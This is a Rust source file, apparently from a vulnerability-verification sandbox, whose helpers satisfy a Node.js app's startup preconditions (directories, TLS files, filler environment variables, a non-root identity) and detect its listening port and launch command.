/// Returns the directory to create, or `None` when the failure is something else.
fn missing_write_dir(log: &str) -> Option<String> {
    if !log.contains("ENOENT") {
        return None;
    }
    // A write-family fs operation must appear in the failure: the app meant to produce a file or
    // directory, not consume one.
    const WRITE_OPS: [&str; 11] = [
        "writeFileSync",
        "appendFileSync",
        "writeFile",
        "appendFile",
        "mkdirSync",
        "mkdir",
        "createWriteStream",
        "copyFileSync",
        "copyFile",
        "renameSync",
        "symlinkSync",
    ];
    if !WRITE_OPS.iter().any(|op| log.contains(op)) {
        return None;
    }
    // The failing path is the last single-quoted segment on the message line (`... open
    // '/root/.app/.env'`; a rename/copy reports source then destination, and the destination —
    // last — is the one being written).
    let line = log
        .lines()
        .find(|line| line.contains("ENOENT: no such file or directory"))?;
    let mut path: Option<&str> = None;
    let mut rest = line;
    while let Some(open) = rest.find('\'') {
        let after = &rest[open + 1..];
        let Some(close) = after.find('\'') else {
            break;
        };
        path = Some(&after[..close]);
        rest = &after[close + 1..];
    }
    let path = path?;
    if !path.starts_with('/') {
        return None;
    }
    let parent = std::path::Path::new(path).parent()?;
    if parent.as_os_str().is_empty() || parent == std::path::Path::new("/") {
        return None;
    }
    Some(parent.to_string_lossy().into_owned())
}

/// When startup fails because the app tried to *read* a TLS key or certificate file that is not in
/// the checkout (`ENOENT` on a `.pem`/`.key`/`.crt`/`.cert`/`.cer` path from a read-family `fs`
/// call), the absolute path the app expected and whether it is the private key (as opposed to the
/// certificate). An `https`/`tls` server reads this material before it binds; without it the process
/// exits before listening. The sandbox stages the self-signed marker pair there on the next attempt
/// (see [`Session::cert_staging_command`]) — a server genuinely needs a certificate to serve TLS, so
/// this reproduces a deployment precondition rather than neutralizing any input. Returns the path and
/// `is_key`, or `None` when the failure is something else.
///
/// Only a file whose name marks it as TLS material qualifies, and only for a read: conjuring an
/// arbitrary file the app meant to consume could mask a real missing-input failure, so the extension
/// (and, for `.pem`, a key/cert hint in the name) must be unambiguous.
fn missing_tls_material(log: &str) -> Option<(String, bool)> {
    if !log.contains("ENOENT") {
        return None;
    }
    // A read-family fs operation must appear: the app meant to load this file, not create it. The app
    // may construct the path with `path.join`, so the read op can be several frames above the failing
    // call; requiring any read op in the log is enough to distinguish a load from a write.
    const READ_OPS: [&str; 4] = ["readFileSync", "readFile", "createReadStream", "read("];
    if !READ_OPS.iter().any(|op| log.contains(op)) {
        return None;
    }
    let line = log
        .lines()
        .find(|line| line.contains("ENOENT: no such file or directory"))?;
    // The failing path is the last single-quoted segment on the message line (`... open '/app/x.pem'`).
    let mut path: Option<&str> = None;
    let mut rest = line;
    while let Some(open) = rest.find('\'') {
        let after = &rest[open + 1..];
        let Some(close) = after.find('\'') else {
            break;
        };
        path = Some(&after[..close]);
        rest = &after[close + 1..];
    }
    let path = path?;
    if !path.starts_with('/') {
        return None;
    }
    let name = std::path::Path::new(path).file_name()?.to_str()?;
    let lower = name.to_ascii_lowercase();
    let is_tls_ext = lower.ends_with(".pem")
        || lower.ends_with(".key")
        || lower.ends_with(".crt")
        || lower.ends_with(".cert")
        || lower.ends_with(".cer");
    if !is_tls_ext {
        return None;
    }
    // `.key` is always the private key; `.crt`/`.cert`/`.cer` are always the certificate. A `.pem`
    // can be either, decided by a `key`/`cert` hint in the file name (`server-key.pem` vs
    // `server-cert.pem`/`server.pem`); a bare `.pem` with no hint is treated as the certificate.
    let is_key = lower.ends_with(".key") || (lower.ends_with(".pem") && lower.contains("key"));
    Some((path.to_owned(), is_key))
}

/// Returns a missing dotenv file that a startup loader explicitly refused to run without. An empty
/// file preserves normal dotenv semantics (no configuration is invented) while allowing the app to
/// continue to its own defaults and subsequent, more specific startup checks.
fn missing_dotenv_file(log: &str) -> Option<String> {
    if !log.contains("ENOENT")
        || !(log.contains("Failed to load .env file")
            || log.to_ascii_lowercase().contains("dotenv"))
    {
        return None;
    }
    let line = log
        .lines()
        .find(|line| line.contains("ENOENT: no such file or directory"))?;
    let mut path: Option<&str> = None;
    let mut rest = line;
    while let Some(open) = rest.find('\'') {
        let after = &rest[open + 1..];
        let Some(close) = after.find('\'') else {
            break;
        };
        path = Some(&after[..close]);
        rest = &after[close + 1..];
    }
    let path = path?;
    if !path.starts_with('/') {
        return None;
    }
    let name = std::path::Path::new(path).file_name()?.to_str()?;
    (name == ".env" || name.starts_with(".env.")).then(|| path.to_owned())
}

/// External-service credential environment variables a sink is gated on, read by name from the
/// sink's own module and the modules it imports (`gating_sources`). Each is given a strong random
/// filler so the handler's "a credential is configured" branch — the one the sink sits behind — is
/// active, reproducing a deployment that configured the integration. Only credential-named variables
/// qualify (`*_TOKEN`, `*_PAT`, `*_SECRET`, `*_PASSWORD`, `*_CREDENTIAL(S)`); a random value can only
/// enable a configured-credential path, never match a real secret or relax an authentication check,
/// and the sandbox's own variables (`NODE_*`/`NPM_*`) are never touched.
fn credential_env(gating_sources: &[String]) -> Vec<RequiredEnv> {
    let mut out: Vec<RequiredEnv> = Vec::new();
    for src in gating_sources {
        for name in env_var_names(src) {
            if credential_name(&name) && out.iter().all(|existing| existing.name != name) {
                out.push(RequiredEnv {
                    name,
                    value: STRONG_FILLER_SECRET.to_owned(),
                    directory: false,
                });
            }
        }
    }
    out
}

/// Typed configuration variables the handler/sink source reads that must hold a usable value for the
/// request to reach the sink rather than crash before it. The handler here builds a path from a
/// deployment variable (`path.join(process.env.PROJECT_PATH, 'dist', ...)` inside the branch that
/// shells out); with the variable unset, `path.join(undefined, ...)` throws and the request handler
/// dies before the sink runs. Only names whose kind is inferable from the name
/// ([`typed_env_value`] — `_PATH`/`_DIR`/`_ROOT`/`_HOME`/`_URL`/`_URI` and secret-like suffixes) get a
/// neutral filler (a fresh empty directory, a nowhere URL, a random secret); a name with no inferable
/// kind (`INLINE_API`, a mode toggle whose value would divert the branch) is left unset, so the
/// vulnerable branch the finding reported stays the one that runs. This is a runtime-environment
/// precondition satisfied honestly, never an input neutralization. Mined from the gating sources only.
fn config_source_env(gating_sources: &[String]) -> Vec<RequiredEnv> {
    let mut out: Vec<RequiredEnv> = Vec::new();
    for src in gating_sources {
        for name in env_var_names(src) {
            if fillable_config_name(&name)
                && out.iter().all(|existing| existing.name != name)
                && let Some((value, directory)) = typed_env_value(&name)
            {
                out.push(RequiredEnv {
                    name,
                    value,
                    directory,
                });
            }
        }
    }
    out
}

/// Whether an environment variable name denotes an external-service credential the sandbox may set
/// to a filler to satisfy a configuration precondition: an `_`-delimited segment of `TOKEN`, `PAT`,
/// `SECRET`, `PASSWORD`, `CREDENTIAL`, `CREDENTIALS` or `APIKEY`, plus the adjacent segments
/// `API_KEY` (so `GITHUB_TOKEN`/`GH_TOKEN`/`GITHUB_PAT`/`GEMINI_API_KEY`/`OPENAI_API_KEY` qualify but
/// `PATH` does not). A generic `*_KEY` is deliberately excluded: cryptographic key pairs such as
/// VAPID public/private keys have strict encodings and an arbitrary filler prevents the application
/// from starting. Never a variable the sandbox owns.
fn credential_name(name: &str) -> bool {
    const KINDS: [&str; 7] = [
        "TOKEN",
        "PAT",
        "SECRET",
        "PASSWORD",
        "CREDENTIAL",
        "CREDENTIALS",
        "APIKEY",
    ];
    let upper = name.to_ascii_uppercase();
    if upper.starts_with("NODE_") || upper.starts_with("NODEJS_") || upper.starts_with("NPM_") {
        return false;
    }
    let segments = upper.split('_').collect::<Vec<_>>();
    segments.iter().any(|segment| KINDS.contains(segment))
        || segments.windows(2).any(|pair| pair == ["API", "KEY"])
}

/// A non-secret value long enough to satisfy startup checks for secret-like environment variables.
const STRONG_FILLER_SECRET: &str = "9f8e7d6c5b4a39281706f5e4d3c2b1a0ffeeddccbbaa998877665544332211009f8e7d6c5b4a39281706f5e4d3c2b1a0ffeeddccbbaa99887766554433221100";

/// The environment variables an app's startup failure says it requires: a variable-style name
/// (`UPPER_SNAKE`, with an underscore) followed in its log by `is required` / `must be set` /
/// `is not set` / `is missing` (`Error: NOOBOT_WORKSPACE_ROOT is required`), or after
/// `environment variable` / `missing` (`Missing required environment variable: DATABASE_URL`).
/// Each gets a neutral value of the kind its name asks for: a fresh empty directory for a
/// `_ROOT`/`_DIR`/`_PATH`/`_HOME` name, a URL that resolves nowhere for a `_URL`/`_URI`, else a
/// plain word. Never one the sandbox sets itself, nor Node's or npm's own (`NODE_OPTIONS`):
/// those would change the sandbox, not satisfy the app.
fn required_env(log: &str) -> Vec<RequiredEnv> {
    const AFTER: [&str; 8] = [
        "is required",
        "must be set",
        "is not set",
        "is missing",
        "must be provided",
        "must be defined",
        "is undefined",
        "not set",
    ];
    const BEFORE: [&str; 3] = ["environment variable", "env var", "missing"];
    let variable = |word: &str| {
        word.len() <= 64
            && word.contains('_')
            && word.bytes().next().is_some_and(|b| b.is_ascii_uppercase())
            && word
                .bytes()
                .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_')
            && !word.starts_with("ERR_")
            && !word.starts_with("NODE_")
            && !word.starts_with("NODEJS_")
            && !word.starts_with("NPM_")
            && !matches!(word, "PORT" | "HOST" | "NODE_ENV")
    };
    let mut out: Vec<RequiredEnv> = Vec::new();
    for line in log.lines() {
        // ASCII lowercasing keeps byte offsets, and a word is ASCII, so offsets stay on
        // character boundaries.
        let lower = line.to_ascii_lowercase();
        let missing_list =
            lower.contains("missing env vars") || lower.contains("missing environment variables");
        let bytes = line.as_bytes();
        let word_byte = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
        let mut words: Vec<(usize, &str)> = Vec::new();
        let mut i = 0;
        while i < bytes.len() {
            if !bytes.get(i).copied().is_some_and(word_byte) {
                i += 1;
                continue;
            }
            let start = i;
            while bytes.get(i).copied().is_some_and(word_byte) {
                i += 1;
            }
            if let Some(word) = line.get(start..i).filter(|w| variable(w)) {
                words.push((start, word));
            }
        }
        for (at, word) in words {
            const QUOTES: [char; 5] = ['"', '\'', '`', ' ', ':'];
            let after = lower[at + word.len()..].trim_start_matches(QUOTES);
            let before = lower[..at].trim_end_matches(QUOTES);
            let before = before.strip_suffix("(s)").unwrap_or(before);
            let after_noun_demand = ["environment variable", "env var"].iter().any(|noun| {
                after
                    .strip_prefix(noun)
                    .map(|rest| rest.trim_start_matches(QUOTES))
                    .is_some_and(|rest| AFTER.iter().any(|phrase| rest.starts_with(phrase)))
            });
            let demanded = AFTER.iter().any(|p| after.starts_with(p))
                || BEFORE.iter().any(|p| before.ends_with(p))
                || after_noun_demand
                || missing_list;
            if demanded && out.iter().all(|e| e.name != word) {
                let (value, directory) =
                    typed_env_value(word).unwrap_or_else(|| ("jsspector".to_owned(), false));
                out.push(RequiredEnv {
                    name: word.to_owned(),
                    value,
                    directory,
                });
            }
        }
    }
    out
}

/// A neutral value matching the kind encoded in an environment variable's name.
fn typed_env_value(name: &str) -> Option<(String, bool)> {
    let last = name.rsplit('_').next().unwrap_or(name).to_ascii_uppercase();
    match last.as_str() {
        "ROOT" | "DIR" | "DIRECTORY" | "PATH" | "HOME" | "FOLDER" => {
            Some((format!("/jss-env/{}", name.to_ascii_lowercase()), true))
        }
        "URL" | "URI" => Some(("http://jss-filler.test/".to_owned(), false)),
        "SECRET" | "SECRETS" | "KEY" | "KEYS" | "TOKEN" | "PASSWORD" | "PASS" | "PASSPHRASE"
        | "SALT" | "SEED" | "NONCE" | "PEPPER" | "SIGNATURE" | "CREDENTIAL" | "CREDENTIALS"
        | "PRIVATEKEY" | "SIGNINGKEY" => Some((STRONG_FILLER_SECRET.to_owned(), false)),
        _ => None,
    }
}

/// Credential/resource variables read by the app file at the top of a startup crash stack.
fn config_env(log: &str, root: &std::path::Path) -> Vec<RequiredEnv> {
    let mut out: Vec<RequiredEnv> = Vec::new();
    for rel in stack_app_files(log, root) {
        let path = root.join(&rel);
        if !std::fs::metadata(&path).is_ok_and(|meta| meta.is_file() && meta.len() <= 512 * 1024) {
            continue;
        }
        let Ok(src) = std::fs::read_to_string(path) else {
            continue;
        };
        for name in env_var_names(&src) {
            if fillable_config_name(&name)
                && out.iter().all(|existing| existing.name != name)
                && let Some((value, directory)) = typed_env_value(&name)
            {
                out.push(RequiredEnv {
                    name,
                    value,
                    directory,
                });
            }
        }
        for (name, key) in dynamic_setting_env_names(&src) {
            if out.iter().any(|existing| existing.name == name) {
                continue;
            }
            let typed_name = format!("SETTING_{}", key.to_ascii_uppercase());
            let value = typed_env_value(&typed_name)
                .map(|(value, _)| value)
                .unwrap_or_else(|| "jsspector".to_owned());
            let Ok(value) = serde_json::to_string(&value) else {
                continue;
            };
            out.push(RequiredEnv {
                name,
                value,
                directory: false,
            });
        }
    }
    out
}

/// Environment-backed settings read through a common three-part helper:
/// `getSetting('auth', 'token', 'secret_key')` resolves to
/// `global_auth_token_secret_key`. The helper JSON-parses the environment value, so the caller wraps
/// the neutral typed filler as JSON before injecting it. Only literal, identifier-shaped segments are
/// accepted; dynamic setting names are left for the application to resolve normally.
fn dynamic_setting_env_names(source: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(relative) = source[from..].find("getSetting(") {
        let start = from + relative + "getSetting(".len();
        let mut rest = &source[start..];
        let mut parts = Vec::new();
        for index in 0..3 {
            rest = rest.trim_start();
            let Some(quote) = rest.chars().next().filter(|ch| matches!(ch, '\'' | '"')) else {
                break;
            };
            let quoted = &rest[quote.len_utf8()..];
            let Some(end) = quoted.find(quote) else {
                break;
            };
            let value = &quoted[..end];
            if value.is_empty()
                || !value
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
            {
                break;
            }
            parts.push(value.to_owned());
            rest = &quoted[end + quote.len_utf8()..];
            if index < 2 {
                let Some(next) = rest.trim_start().strip_prefix(',') else {
                    break;
                };
                rest = next;
            }
        }
        if let [kind, subtype, key] = parts.as_slice() {
            let name = format!("global_{kind}_{subtype}_{key}");
            if out.iter().all(|(existing, _)| existing != &name) {
                out.push((name, key.clone()));
            }
        }
        from = start;
    }
    out
}

fn fillable_config_name(name: &str) -> bool {
    if !(name.len() <= 64
        && name.contains('_')
        && name.bytes().next().is_some_and(|b| b.is_ascii_uppercase())
        && name
            .bytes()
            .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_'))
    {
        return false;
    }
    if name.starts_with("NODE_")
        || name.starts_with("NODEJS_")
        || name.starts_with("NPM_")
        || name.starts_with("ERR_")
    {
        return false;
    }
    if matches!(name, "PORT" | "HOST" | "NODE_ENV" | "CI") {
        return false;
    }
    // Encoded/asymmetric key material cannot be replaced with an arbitrary long secret. Apps often
    // generate a valid pair when these variables are absent (VAPID is a common example), whereas a
    // filler makes the crypto library reject startup before that fallback runs.
    if name.ends_with("_PUBLIC_KEY") || name.ends_with("_PRIVATE_KEY") {
        return false;
    }
    db_connection_env()
        .iter()
        .all(|(db_name, _)| db_name != name)
}

/// App-owned JavaScript files named by Node stack frames under the image's `/app` root.
fn stack_app_files(log: &str, root: &std::path::Path) -> Vec<String> {
    let bytes = log.as_bytes();
    let mut out: Vec<String> = Vec::new();
    let prefixes = ["/app/".to_owned(), format!("{}/", root.display())];
    for prefix in prefixes {
        let mut from = 0;
        while let Some(rel) = log[from..].find(&prefix) {
            let start = from + rel + prefix.len();
            let mut end = start;
            while bytes.get(end).is_some_and(|byte| {
                !matches!(
                    byte,
                    b':' | b')' | b'(' | b'\'' | b'"' | b' ' | b'\n' | b'\r' | b'\t'
                )
            }) {
                end += 1;
            }
            from = start;
            let Some(path) = log.get(start..end) else {
                continue;
            };
            if (path.ends_with(".js") || path.ends_with(".mjs") || path.ends_with(".cjs"))
                && !path.starts_with("node_modules/")
                && !path.contains("/node_modules/")
                && !path.split('/').any(|segment| segment == "..")
                && out.len() < 64
                && out.iter().all(|existing| existing != path)
            {
                out.push(path.to_owned());
            }
        }
    }
    out
}

/// A non-root uid/gid to run a privilege-dropping app as. Any fixed non-zero pair works: the app's
/// `setuid`/`setgid` drop to this same identity, a legal no-op, and the pair clears the app's own
/// `uid === 0 || gid === 0` refusal. 10001 is high enough to avoid clashing with image accounts.
const SANDBOX_RUN_UID: u32 = 10001;
const SANDBOX_RUN_GID: u32 = 10001;

/// A runtime-user precondition discovered from an app's own source: the non-root identity to run as
/// plus the environment its deployment supplies for the privilege drop to succeed.
struct PrivilegeDrop {
    run_as: (u32, u32),
    env: Vec<RequiredEnv>,
}

/// Whether the app drops root at startup, and if so the runtime user and environment that lets it do
/// so honestly in the sandbox. An app that calls `process.setuid`/`process.setgid` with a uid/gid it
/// reads from the environment is a deployment that starts as root and sheds privilege to a service
/// account its operator configures. The sandbox reproduces that precondition truthfully: it runs the
/// container as a fixed non-root user and points the uid/gid variables the app reads at that same
/// identity, so the drop is a no-op to who the process already is — it genuinely ends unprivileged,
/// nothing is monkeypatched, suppressed, or left holding privilege. Any port variable the app reads
/// is pinned to the sandbox port too, since a non-root process cannot bind the privileged default
/// (80) such apps often fall back to. Returns `None` when no privilege drop is present.
fn privilege_drop_fixture(app_root: &std::path::Path, port: u16) -> Option<PrivilegeDrop> {
    let sources = app_source_files(app_root);
    let drops_root = sources
        .iter()
        .any(|src| src.contains("process.setuid(") || src.contains("process.setgid("));
    if !drops_root {
        return None;
    }
    let mut env: Vec<RequiredEnv> = Vec::new();
    for src in &sources {
        for name in env_var_names(src) {
            let upper = name.to_ascii_uppercase();
            let value = if upper.contains("UID") {
                SANDBOX_RUN_UID.to_string()
            } else if upper.contains("GID") {
                SANDBOX_RUN_GID.to_string()
            } else if upper.contains("PORT") {
                port.to_string()
            } else {
                continue;
            };
            if env.iter().all(|existing| existing.name != name) {
                env.push(RequiredEnv {
                    name,
                    value,
                    directory: false,
                });
            }
        }
    }
    Some(PrivilegeDrop {
        run_as: (SANDBOX_RUN_UID, SANDBOX_RUN_GID),
        env,
    })
}

/// Local verification has no container-level `--user`. When it already runs unprivileged, point the
/// application's uid/gid variables at that real identity so its privilege drop is a legal no-op. A
/// root local runner (the Satori container) keeps the isolated fixed identity and spawns only the
/// application child under it in [`Session::run_local_app`].
fn local_privilege_drop_fixture(app_root: &std::path::Path, port: u16) -> Option<PrivilegeDrop> {
    let fixture = privilege_drop_fixture(app_root, port)?;
    let identity = current_unix_identity()?;
    Some(adapt_privilege_drop_to_local_identity(fixture, identity))
}

fn adapt_privilege_drop_to_local_identity(
    mut fixture: PrivilegeDrop,
    identity: (u32, u32),
) -> PrivilegeDrop {
    if identity != (0, 0) {
        fixture.run_as = identity;
        for var in &mut fixture.env {
            let upper = var.name.to_ascii_uppercase();
            if upper.contains("UID") {
                var.value = identity.0.to_string();
            } else if upper.contains("GID") {
                var.value = identity.1.to_string();
            }
        }
    }
    fixture
}

#[cfg(unix)]
fn current_unix_identity() -> Option<(u32, u32)> {
    let read = |flag: &str| {
        let output = Command::new("id").arg(flag).output().ok()?;
        output.status.success().then(|| {
            String::from_utf8_lossy(&output.stdout)
                .trim()
                .parse::<u32>()
                .ok()
        })?
    };
    Some((read("-u")?, read("-g")?))
}

#[cfg(not(unix))]
fn current_unix_identity() -> Option<(u32, u32)> {
    None
}

/// The app's own JavaScript source (never `node_modules` or build output), bounded in breadth and
/// depth so scanning a large repo stays cheap. Used only to recognize a startup privilege drop and
/// the environment variables it reads.
fn app_source_files(app_root: &std::path::Path) -> Vec<String> {
    const SKIP_DIRS: [&str; 7] = [
        "node_modules",
        ".git",
        "build",
        "dist",
        "coverage",
        ".next",
        "public",
    ];
    let mut out = Vec::new();
    let mut stack = vec![(app_root.to_path_buf(), 0u32)];
    while let Some((dir, depth)) = stack.pop() {
        if depth > 4 || out.len() >= 400 {
            break;
        }
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let Ok(kind) = entry.file_type() else {
                continue;
            };
            if kind.is_dir() {
                let name = entry.file_name();
                let name = name.to_string_lossy();
                if !name.starts_with('.') && !SKIP_DIRS.contains(&name.as_ref()) {
                    stack.push((path, depth + 1));
                }
            } else if path
                .extension()
                .and_then(|ext| ext.to_str())
                .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"))
                && std::fs::metadata(&path).is_ok_and(|meta| meta.len() <= 512 * 1024)
                && let Ok(src) = std::fs::read_to_string(&path)
            {
                out.push(src);
            }
        }
    }
    out
}

/// Every environment variable name read in `src` via `process.env.NAME`, `process.env['NAME']` or
/// `process.env["NAME"]`. Deliberately simple textual extraction — only variable *names* are needed.
fn env_var_names(src: &str) -> Vec<String> {
    let mut out = Vec::new();
    let needle = "process.env";
    let bytes = src.as_bytes();
    let mut from = 0;
    while let Some(rel) = src[from..].find(needle) {
        let mut i = from + rel + needle.len();
        let name = if bytes.get(i) == Some(&b'.') {
            i += 1;
            let start = i;
            while bytes
                .get(i)
                .copied()
                .is_some_and(|b| b.is_ascii_alphanumeric() || b == b'_')
            {
                i += 1;
            }
            src.get(start..i).filter(|n| !n.is_empty())
        } else if bytes.get(i) == Some(&b'[') {
            if let Some(quote @ (b'\'' | b'"')) = bytes.get(i + 1).copied() {
                let start = i + 2;
                src[start..]
                    .find(quote as char)
                    .map(|end| &src[start..start + end])
                    .filter(|n| {
                        !n.is_empty() && n.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
                    })
            } else {
                None
            }
        } else {
            None
        };
        if let Some(name) = name
            && !out.iter().any(|existing| existing == name)
        {
            out.push(name.to_owned());
        }
        from += rel + needle.len();
    }
    out
}

/// A Node script, run inside the app container, that prints the port the app answers on and
/// exits 0, else exits 1. The port asked for via `PORT` when the app listens there; otherwise,
/// for an app that fixes its own port (`server.listen(8000)`), the one TCP port the container
/// listens on where the driver reaches it (from `/proc/net/tcp*`, bound to every address or to
/// `127.0.0.1`/`::1`; Docker's own resolver on `127.0.0.11` is not the app, and nothing else
/// runs there).
///
/// Several candidates and none on `PORT` is no longer ambiguous: an app that fixes its own port and
/// also stands up a sidecar listener (a WebSocket server on its own port, `ws` / `express-ws`, is the
/// common case) binds two ports, only one of which serves the HTTP routes the finding targets. Each
/// candidate is probed with a plain `GET /`; the one that answers as a real HTTP server is chosen,
/// skipping a WebSocket-only endpoint (standalone `ws` answers a non-upgrade request with
/// `426 Upgrade Required`). The lowest such port wins when more than one serves HTTP.
#[cfg(test)]
fn listening_probe_excluding(wanted: u16, excluded: &[u16]) -> String {
    listening_probe_excluding_candidates(wanted, excluded, &[])
}

fn listening_probe_excluding_candidates(
    wanted: u16,
    excluded: &[u16],
    candidates: &[u16],
) -> String {
    let excluded = excluded
        .iter()
        .map(u16::to_string)
        .collect::<Vec<_>>()
        .join(",");
    let candidates = candidates
        .iter()
        .map(u16::to_string)
        .collect::<Vec<_>>()
        .join(",");
    format!(
        "const fs=require('fs'),net=require('net');const ports=new Set([{candidates}]);\
         const excluded=new Set([{excluded}]);\
         for(const f of ['/proc/net/tcp','/proc/net/tcp6']){{let t='';try{{t=fs.readFileSync(f,'utf8')}}catch{{}}\
         for(const l of t.split('\\n').slice(1)){{const c=l.trim().split(/\\s+/);\
         const [a,p]=(c[1]||'').split(':');\
         const port=parseInt(p,16);\
         if(c[3]==='0A'&&p&&!excluded.has(port)&&(/^0+$/.test(a)||a==='0100007F'||a==='00000000000000000000000001000000'))ports.add(port)}}}}\
         const list=[...ports];const hosts=['127.0.0.1','::1'];\
         const direct=!excluded.has({wanted})&&(ports.has({wanted})||!list.length);\
         const single=direct?{wanted}:(list.length===1?list[0]:0);\
         function tcpOk(port,cb){{let hi=0;(function go(){{if(hi>=hosts.length)return cb(false);\
         net.connect({{port,host:hosts[hi++]}}).on('connect',function(){{this.destroy();cb(true)}}).on('error',()=>go());}})();}}\
         function httpOk(port,cb){{let hi=0;(function go(){{if(hi>=hosts.length)return cb(false);\
         const s=net.connect({{port,host:hosts[hi++]}});let buf='';let done=false;\
         const fin=(v)=>{{if(done)return;done=true;try{{s.destroy()}}catch{{}}if(v)return cb(true);go()}};\
         s.setTimeout(2000);\
         s.on('connect',()=>s.write('GET / HTTP/1.0\\r\\nHost: localhost\\r\\nConnection: close\\r\\n\\r\\n'));\
         s.on('data',(d)=>{{buf+=d;const m=/^HTTP\\/\\d\\.\\d (\\d{{3}})/.exec(buf.split('\\r\\n')[0]);\
         if(m)fin(m[1]!=='426'&&!/MongoDB|native driver port/i.test(buf))}});\
         s.on('timeout',()=>fin(false));s.on('error',()=>fin(false));s.on('close',()=>fin(false));}})();}}\
         if(single){{const ready=direct?tcpOk:httpOk;ready(single,ok=>{{\
         if(ok){{console.log(single);process.exit(0)}}process.exit(1)}})}}\
         else{{const cands=list.slice().sort((a,b)=>a-b);let i=0;\
         (function next(){{if(i>=cands.length)process.exit(1);const port=cands[i++];\
         httpOk(port,ok=>{{if(ok){{console.log(port);process.exit(0)}}next()}});}})();}}"
    )
}

/// The app's launch command for the image `CMD`. A launchable package manifest
/// ([`manifest_start_command`]) is preferred; failing that, when the finding's own file
/// (`entry`, relative to `root`) is a self-contained server that constructs a listener and calls
/// `.listen`, it is run directly with `node`. This lets a repository of standalone scripts with no
/// `package.json` still be exercised.
fn start_command(root: &std::path::Path, entry: Option<&std::path::Path>) -> Option<String> {
    // A module worker (`export default { fetch(request) }`) — Cloudflare Workers, Deno, Bun — binds no
    // listener of its own; the deployment runtime invokes its `fetch` method once per request and
    // serves the whole origin. The manifest's own launch (a `wrangler dev` / `wrangler deploy` that
    // needs the Workers runtime, or a bundler entry that may not even exist in the checkout) cannot
    // serve it in the verifier image, so when the finding's own file is such a module, serve its
    // `fetch` handler through the worker host shim. Checked before the manifest so the real entry point
    // wins over a launch that could never bind the route under test.
    if let Some(rel) = entry.and_then(|path| path.to_str())
        && let Some(file) = package_file(root, rel)
        && is_module_worker(&root.join(&file))
    {
        return Some(worker_host_command(&file));
    }
    // A Vercel/Netlify filesystem function (`api/proxy.js`) binds no listener of its own: the platform
    // runtime invokes its default export per request. The manifest's own launch serves the front-end
    // bundle (`vite`, a static build), never these functions, so when the finding's own file is such a
    // module serve its default-export handler through the worker host shim, which already drives a
    // function-valued default export (an edge function's `(request) => Response`, or a Node `(req,
    // res)` handler). Checked before the manifest so the real entry point wins.
    if let Some(rel) = entry.and_then(|path| path.to_str())
        && let Some(file) = package_file(root, rel)
        && is_vercel_function(root, &file)
    {
        return Some(worker_host_command(&file));
    }
    // A package can expose several independent servers from one manifest: its ordinary `start`
    // entry may bind one port while the file that owns this finding constructs and listens on a
    // different Express/HTTP app. Running the manifest then makes port discovery select a healthy
    // but unrelated server. A self-contained finding file needs no host scaffolding, so launch that
    // exact server directly before considering the package-wide command.
    if let Some(rel) = entry.and_then(|path| path.to_str())
        && let Some(file) = package_file(root, rel)
        && is_standalone_server(&root.join(&file))
    {
        return Some(node_file_command(&file));
    }
    if let Some(command) = manifest_start_command(root) {
        // A manifest whose only launch is the Azure Functions host (`func start`) depends on the Azure
        // Functions Core Tools runtime to serve the `app.http(...)` triggers a v4 module registers; that
        // runtime is not in the verifier image and the module binds no listener of its own. When the
        // finding's own file is such a module, mount its registered triggers on a throwaway server
        // through the Azure host shim so the route under test is actually served.
        if manifest_launch_is_azure_functions(root)
            && let Some(rel) = entry.and_then(|path| path.to_str())
            && let Some(file) = package_file(root, rel)
            && is_azure_functions_v4_module(&root.join(&file))
        {
            return Some(azure_host_command(&file));
        }
        // A manifest whose only launch is a CLI dispatcher (commander/yargs) prints its usage and
        // exits without ever binding a port, so the route under test is never served. When the
        // finding's own file is a mountable Express router module, host that router on a throwaway
        // server instead; otherwise fall back to the manifest command.
        if manifest_launch_is_cli(root)
            && let Some(rel) = entry.and_then(|path| path.to_str())
            && let Some(file) = package_file(root, rel)
            && is_express_router_module(&root.join(&file))
        {
            return Some(express_host_command(&file));
        }
        // A manifest whose only launch is a front-end dev/build server (`react-scripts start`,
        // `vite`, `vue-cli-service serve`, …) compiles and serves the client bundle, never the
        // HTTP backend where the finding's sink lives. When the finding's own file is a
        // self-contained server (it constructs a listener and calls `.listen`), run that file
        // directly so the backend route under test is actually served.
        if manifest_launch_is_frontend(root)
            && let Some(rel) = entry.and_then(|path| path.to_str())
            && let Some(file) = package_file(root, rel)
            && is_standalone_server(&root.join(&file))
        {
            return Some(format!("[\"node\",\"{file}\"]"));
        }
        // A start script that runs `node <file>` for a file absent from the package can never
        // launch (`MODULE_NOT_FOUND`). When the finding's own file exports an Express app or router
        // without listening (the start script was meant to serve it), mount it through the Express
        // host shim so the route under test is served by the module's own handlers.
        if manifest_start_file_missing(root)
            && let Some(rel) = entry.and_then(|path| path.to_str())
            && let Some(file) = package_file(root, rel)
            && (is_express_router_module(&root.join(&file))
                || is_express_app_module(&root.join(&file)))
        {
            return Some(express_host_command(&file));
        }
        return Some(command);
    }
    let rel = entry?.to_str()?;
    let file = package_file(root, rel)?;
    if is_standalone_server(&root.join(&file)) {
        return Some(format!("[\"node\",\"{file}\"]"));
    }
    if is_express_router_module(&root.join(&file)) {
        return Some(express_host_command(&file));
    }
    if is_plugin_handler(&root.join(&file)) {
        return Some(plugin_host_command(&file));
    }
    if is_lifecycle_server_module(&root.join(&file)) {
        return Some(lifecycle_host_command(&file));
    }
    if is_node_red_node_module(&root.join(&file)) {
        return Some(node_red_host_command(&file));
    }
    is_route_handler_module(&root.join(&file)).then(|| route_host_command(&file))
}

/// Whether the package manifest's only selectable launch is a CLI dispatcher `main` file. Mirrors
/// the precedence in [`manifest_start_command`]: a `start`, `serve`, `server`, or `app` script is a
/// real launch, not a CLI, so those short-circuit to `false`. Otherwise the decision rests on the
/// `main` file being a command-line dispatcher ([`is_cli_dispatcher`]) — one that parses argv and
/// prints usage rather than listening.
fn manifest_launch_is_cli(root: &std::path::Path) -> bool {
    let Ok(manifest) = std::fs::read_to_string(root.join("package.json")) else {
        return false;
    };
    if has_start_script(&manifest) {
        return false;
    }
